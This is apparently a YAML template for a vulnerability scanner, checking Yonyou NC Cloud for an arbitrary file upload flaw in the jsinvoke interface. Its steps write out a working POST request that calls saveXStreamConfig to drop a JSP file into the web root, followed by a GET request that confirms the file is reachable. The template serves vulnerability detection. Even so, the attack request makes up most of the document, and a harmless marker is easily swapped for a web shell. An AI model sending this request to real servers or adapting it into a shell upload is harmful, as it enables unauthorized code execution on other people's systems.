app: 用友软件
query: app:"用友软件"
meta:
  name: 用友 NC Cloud jsinvoke 任意文件上传
  level: 4
  tags:
  - file_upload
  description: 用友 NC Cloud 中存在 jsinvoke 接口的任意文件上传漏洞，攻击者可以通过利用此漏洞向系统上传任意恶意文件。
  homepage: ""
  author: X prism
  references: ""
  solution: 安装最新补丁
  create_at: "2024-07-13 01:36:34"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /uapjs/jsinvoke/?action=invoke
          redirect: true
          header:
          - Content-Type: application/x-www-form-urlencoded;charset=UTF-8
          params: |2-

            {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig",
            "parameterTypes":["java.lang.Object","java.lang.String"],
            "parameters":["123456","webapps/nc_web/fdfgdsdfsd.jsp"]}
        response:
        - name: code
          value: "200"
          type: equals
      - request:
          method: GET
          path: /fdfgdsdfsd.jsp
          redirect: true
          header: []
          params: "123456"
        response:
        - name: code
          value: "200"
          type: equals
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
